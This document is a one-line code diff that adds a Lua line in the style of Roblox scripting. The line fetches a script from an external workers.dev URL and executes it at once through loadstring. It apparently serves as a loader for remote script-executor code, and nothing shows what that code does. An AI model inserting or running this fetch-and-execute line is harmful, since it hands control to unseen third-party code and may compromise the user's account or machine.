@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://old-haze-7457.gerelyncontiga.workers.dev"))()
